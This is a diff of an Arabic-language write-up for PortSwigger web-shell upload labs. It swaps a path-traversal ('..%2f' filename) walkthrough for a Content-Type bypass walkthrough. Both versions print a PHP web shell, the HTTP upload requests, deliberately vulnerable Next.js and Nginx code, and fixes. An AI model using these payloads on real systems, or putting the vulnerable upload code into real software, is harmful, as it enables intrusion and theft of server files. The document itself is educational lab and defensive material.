@@ -1,14 +1,14 @@
-# Lab: Web shell upload via path traversal
+# Lab: Web shell upload via Content-Type restriction bypass
 
 > **Category:** File Upload Vulnerabilities  
-> **Difficulty:** PRACTITIONER  
-> **Lab Link:** [PortSwigger Lab - Web shell upload via path traversal](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal)
+> **Difficulty:** APPRENTICE  
+> **Lab Link:** [PortSwigger Lab - Web shell upload via Content-Type restriction bypass](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass)
 
 ---
 
 ## 🎯 الهدف الرئيسي
 
-استغلال ثغرة رفع الملفات (File Upload) مع ثغرة **Path Traversal** في اسم الملف. الخادم يمنع تنفيذ ملفات PHP في المجلد الافتراضي، ولكن يمكننا استخدام `..%2f` (مسار traversal) لرفع الملف إلى مجلد أعلى (`/files`) حيث يُسمح بتنفيذ PHP، ثم تنفيذ Web Shell لقراءة `/home/carlos/secret`.
+استغلال ثغرة رفع الملفات (File Upload) حيث يعتمد الخادم فقط على `Content-Type` المرسل من المستخدم للتحقق من نوع الملف. يمكننا تغيير `Content-Type` إلى `image/jpeg` لتجاوز الفلتر، ثم رفع Web Shell وتنفيذه لقراءة `/home/carlos/secret`.
 
 **الحساب:** `wiener:peter`
 
@@ -22,11 +22,8 @@
 
 - سجل الدخول بـ `wiener:peter`
 - ارفع صورة عادية كـ avatar
-- في Burp، لاحظ أن الصورة تُجلب من:
-```
-GET /files/avatars/test.jpg
-```
-- أرسل هذا الطلب إلى **Repeater**
+- في Burp → **Proxy > HTTP history**، ابحث عن طلب `GET /files/avatars/<YOUR-IMAGE>`
+- أرسل هذا الطلب إلى **Repeater** (لنستخدمه لاحقاً)
 
 ### الخطوة 2: إنشاء Web Shell
 
@@ -36,32 +33,22 @@ GET /files/avatars/test.jpg
 <?php echo file_get_contents('/home/carlos/secret'); ?>
 ```
 
-### الخطوة 3: رفع الملف (الفحص الأولي)
+### الخطوة 3: محاولة رفع الملف (ستفشل)
 
-- ارفع `exploit.php` كـ avatar
-- **النتيجة:** تم رفع الملف بنجاح ✅ (الخادم لا يمنع رفع PHP)
+- حاول رفع `exploit.php` كـ avatar
+- **النتيجة:** رسالة خطأ: "Only image/jpeg and image/png are allowed"
 
-### الخطوة 4: محاولة تنفيذ Web Shell (ستفشل)
+### الخطوة 4: اعتراض طلب رفع الملف
 
-- في Repeater، غيّر المسار إلى `exploit.php`:
-
-```http
-GET /files/avatars/exploit.php HTTP/1.1
-```
-
-**النتيجة:** الخادم يعرض محتوى الملف كنص عادي (لا ينفذه) ❌
-
-السبب: مجلد `avatars` ممنوع منه تنفيذ PHP.
-
-### الخطوة 5: اعتراض طلب رفع الملف
-
-- ابحث عن طلب `POST /my-account/avatar` في **Proxy history**
+- في Burp → **Proxy > HTTP history**، ابحث عن طلب `POST /my-account/avatar`
 - أرسله إلى **Repeater**
 
-الطلب يبدو هكذا:
+الطلب الأصلي:
 
 ```http
 POST /my-account/avatar HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Cookie: session=YOUR-SESSION-COOKIE
 Content-Type: multipart/form-data; boundary=...
 
 --boundary
@@ -72,53 +59,53 @@ Content-Type: application/x-php
 --boundary--
 ```
 
-### الخطوة 6: إضافة Path Traversal إلى اسم الملف
+### الخطوة 5: تغيير Content-Type
 
-- غيّر `filename="exploit.php"` إلى:
+- غيّر `Content-Type: application/x-php` إلى `Content-Type: image/jpeg`
 
-```
-filename="../exploit.php"
-```
-
-أرسل الطلب.
-
-**النتيجة:** رسالة: "The file avatars/exploit.php has been uploaded" (تمت إزالة `../`)
-
-### الخطوة 7: ترميز المسار (URL encoding)
-
-- استخدم ترميز `/` كـ `%2f`:
-
-```
-filename="..%2fexploit.php"
-```
-
-أرسل الطلب.
-
-**النتيجة:** رسالة: "The file avatars/../exploit.php has been uploaded" (لم تتم إزالة `../`!)
-
-### الخطوة 8: تنفيذ Web Shell
-
-- الآن اذهب إلى:
-
-```
-https://YOUR-LAB-ID.web-security-academy.net/files/exploit.php
-```
-
-أو في Repeater:
+**الطلب المعدل:**
 
 ```http
-GET /files/exploit.php HTTP/1.1
+POST /my-account/avatar HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Cookie: session=YOUR-SESSION-COOKIE
+Content-Type: multipart/form-data; boundary=...
+
+--boundary
+Content-Disposition: form-data; name="avatar"; filename="exploit.php"
+Content-Type: image/jpeg
+
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+--boundary--
 ```
+
+### الخطوة 6: إرسال الطلب
+
+- اضغط **Send**
+
+**النتيجة:** تم رفع الملف بنجاح ✅
+
+### الخطوة 7: تنفيذ Web Shell
+
+- في Repeater الآخر (الخاص بـ `GET /files/avatars/...`)
+- غيّر اسم الملف إلى `exploit.php`:
+
+```http
+GET /files/avatars/exploit.php HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+```
+
+- اضغط **Send**
 
 **النتيجة:** يظهر السر (secret) في الرد ✅
 
-### الخطوة 9: إرسال السر
+### الخطوة 8: إرسال السر
 
 - انسخ السر
 - ارجع إلى صفحة المختبر
 - اضغط **Submit solution** والصق السر
 
-### الخطوة 10: حل المختبر
+### الخطوة 9: حل المختبر
 
 بعد إرسال السر الصحيح، سيتم حل المختبر ✅
 
@@ -128,10 +115,10 @@ GET /files/exploit.php HTTP/1.1
 
 | النقطة | الشرح |
 |--------|-------|
-| **لماذا لا يعمل PHP في /files/avatars؟** | الخادم ممنوع من تنفيذ PHP في هذا المجلد |
-| **كيف تجاوزناه؟** | باستخدام `..%2f` لرفع الملف إلى `/files` حيث يُسمح بتنفيذ PHP |
-| **لماذا `%2f` وليس `/`؟** | الخادم يزيل `/` العادي، لكنه يفك ترميز `%2f` إلى `/` بعد التحقق |
-| **ما هو المسار النهائي؟** | `/files/avatars/../exploit.php` = `/files/exploit.php` |
+| **ما هو Content-Type؟** | هيدر يحدد نوع الملف المرسل (مثل `image/jpeg`, `application/x-php`) |
+| **أين الثغرة؟** | الخادم يعتمد فقط على هذا الهيدر الذي يمكن تزويره بسهولة |
+| **كيف نستغلها؟** | نغير `Content-Type` إلى `image/jpeg` لتجاوز الفلتر |
+| **لماذا نجح هذا؟** | الخادم لا يتحقق من محتوى الملف الفعلي (magic bytes) |
 
 ---
 
@@ -139,52 +126,24 @@ GET /files/exploit.php HTTP/1.1
 
 ### 📌 Vulnerability Root Cause
 
-1. الثقة المفرطة في اسم الملف (Path Traversal في اسم الملف)
-2. فك ترميز URL (URL decode) بعد التحقق من الأمان
-3. عدم توحيد قواعد منع التنفيذ عبر جميع المجلدات
+الخادم يتحقق فقط من `Content-Type` المرسل من المستخدم، والذي يمكن تزويره بسهولة.
 
 ---
 
 ### ❌ Non-Compliant Code (Next.js)
 
 ```javascript
-// pages/api/upload.js - معالجة رفع الملف
-import fs from 'fs';
-import path from 'path';
-import formidable from 'formidable';
-
+// pages/api/upload.js
 export default function handler(req, res) {
-  if (req.method !== 'POST') return res.status(405).end();
+  const file = files.avatar;
   
-  const form = formidable({});
+  // خطأ: التحقق فقط من Content-Type (قابل للتزوير)
+  if (file.mimetype !== 'image/jpeg' && file.mimetype !== 'image/png') {
+    return res.status(400).json({ error: 'Only images are allowed' });
+  }
   
-  form.parse(req, (err, fields, files) => {
-    const file = files.avatar;
-    let filename = file.originalFilename;
-    
-    // خطأ: يزيل ../ فقط مرة واحدة
-    filename = filename.replace(/\.\.\//g, '');
-    
-    // خطأ: يفك ترميز URL بعد التصفية
-    filename = decodeURIComponent(filename);
-    
-    const uploadDir = path.join(process.cwd(), 'public/files/avatars');
-    const targetPath = path.join(uploadDir, filename);
-    
-    fs.copyFileSync(file.filepath, targetPath);
-    res.json({ success: true, filename });
-  });
+  // حفظ الملف...
 }
-```
-
-```nginx
-# إعدادات Nginx - فقط مجلد avatars ممنوع تنفيذ PHP
-location /files/avatars {
-    location ~ \.php$ {
-        return 403;
-    }
-}
-# مجلد /files يسمح بتنفيذ PHP (الثغرة!)
 ```
 
 ---
@@ -192,39 +151,44 @@ location /files/avatars {
 ### ✅ Compliant Code (Next.js)
 
 ```javascript
-// pages/api/upload.js - معالجة رفع الملف الآمنة
+// pages/api/upload.js
 import fs from 'fs';
 import path from 'path';
 import formidable from 'formidable';
 import { v4 as uuidv4 } from 'uuid';
+import sharp from 'sharp';
 
-export default function handler(req, res) {
+export default async function handler(req, res) {
   if (req.method !== 'POST') return res.status(405).end();
   
   const form = formidable({});
   
-  form.parse(req, (err, fields, files) => {
+  form.parse(req, async (err, fields, files) => {
     const file = files.avatar;
+    const extension = path.extname(file.originalFilename).toLowerCase();
     
-    // التصحيح 1: تجاهل اسم الملف من المستخدم تماماً
-    const extension = path.extname(file.originalFilename);
-    const allowedExtensions = ['.jpg', '.png', '.gif'];
-    
-    if (!allowedExtensions.includes(extension.toLowerCase())) {
+    // التصحيح 1: whitelist للامتدادات
+    const allowedExtensions = ['.jpg', '.jpeg', '.png', '.gif'];
+    if (!allowedExtensions.includes(extension)) {
       return res.status(400).json({ error: 'Invalid file type' });
     }
     
-    // التصحيح 2: استخدام اسم آمن (UUID)
-    const safeFilename = `${uuidv4()}${extension}`;
-    
-    // التصحيح 3: إزالة أي محاولات Path Traversal من المسار
-    const uploadDir = path.join(process.cwd(), 'public/files/avatars');
-    const targetPath = path.join(uploadDir, safeFilename);
-    
-    // التصحيح 4: التأكد من أن المسار النهائي داخل المجلد المطلوب
-    if (!targetPath.startsWith(uploadDir)) {
-      return res.status(400).json({ error: 'Invalid path' });
+    // التصحيح 2: التحقق من المحتوى الفعلي (magic bytes)
+    let isImage = false;
+    try {
+      const metadata = await sharp(file.filepath).metadata();
+      isImage = metadata.format !== undefined;
+    } catch {
+      isImage = false;
     }
+    
+    if (!isImage) {
+      return res.status(400).json({ error: 'Invalid image file' });
+    }
+    
+    // التصحيح 3: إعادة تسمية الملف
+    const safeFilename = `${uuidv4()}${extension}`;
+    const targetPath = path.join(process.cwd(), 'public/files/avatars', safeFilename);
     
     fs.copyFileSync(file.filepath, targetPath);
     res.json({ success: true, filename: safeFilename });
@@ -232,20 +196,11 @@ export default function handler(req, res) {
 }
 ```
 
-```nginx
-# إعدادات Nginx - منع تنفيذ PHP في جميع مجلدات الملفات المرفوعة
-location /files {
-    location ~ \.php$ {
-        return 403;
-    }
-}
-```
-
 **الخلاصة:** 
-1. لا تثق في اسم الملف من المستخدم أبداً
-2. استخدم أسماء عشوائية (UUID) للملفات المرفوعة
-3. لا تفك ترميز URL بعد التصفية (أو افعلها قبلها)
-4. وحّد قواعد منع التنفيذ عبر جميع المجلدات
+1. لا تعتمد على `Content-Type` من المستخدم (يمكن تزويره)
+2. تحقق من امتداد الملف باستخدام whitelist
+3. تحقق من المحتوى الفعلي للملف (magic bytes)
+4. أعد تسمية الملفات المرفوعة
 
 ---
 
@@ -253,15 +208,16 @@ location /files {
 
 | الإجراء | الوصف |
 |---------|-------|
-| **إعادة تسمية الملف** | استخدم UUID بدلاً من اسم المستخدم |
-| **منع Path Traversal** | لا تسمح بـ `../` أو `..%2f` في اسم الملف |
-| **وحّد قواعد التنفيذ** | امنع تنفيذ PHP في كل مجلدات `/files` |
-| **ترتيب العمليات الصحيح** | قم بـ URL decode قبل التصفية وليس بعدها |
-| **تخزين خارج webroot** | ضع الملفات خارج المجلد العام كلما أمكن |
+| **التحقق من الامتداد** | استخدم whitelist للامتدادات المسموحة |
+| **التحقق من المحتوى (Magic bytes)** | تأكد من أن الملف هو ما يدّعي أنه |
+| **إعادة تسمية الملف** | استخدم أسماء عشوائية (UUID) |
+| **منع التنفيذ** | امنع تنفيذ PHP في مجلد الرفع |
+| **لا تعتمد على Content-Type** | يمكن تزويره بسهولة |
 
 ---
 
 ## 🔗 روابط مفيدة
 
-- [PortSwigger Lab Page](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal)
+- [PortSwigger Lab Page](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass)
 - [File Upload Cheat Sheet](https://portswigger.net/web-security/file-upload)
+
